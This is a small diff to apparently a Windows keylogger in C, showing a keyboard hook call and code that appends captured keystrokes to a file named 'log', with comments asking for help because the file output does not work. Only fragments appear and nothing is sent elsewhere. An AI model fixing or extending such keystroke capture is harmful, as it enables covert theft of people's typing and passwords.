@@ -1,3 +1,5 @@
+//I can't get the file output to work and I have no idea what's wrong everything looks like it's correct 
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
@@ -117,7 +119,7 @@ int save(int key_stroke) {
         }
         sprintf_s(output, sizeof(output), "%c", key);
     }
-    fputs(output, outputtext);
+    fputs(output, outputtext); 
     fflush(outputtext);
     printf("%s", output);
     return 0;
@@ -138,7 +140,7 @@ int main() {
     
     const char* keylog = "log";
     printf("Logging output to %s\n", keylog);
-    FILE* outputtext = fopen(keylog, "a"); //please fix this it's not working :(
+    FILE* outputtext = fopen(keylog, "a");
     
     SetHook();
     
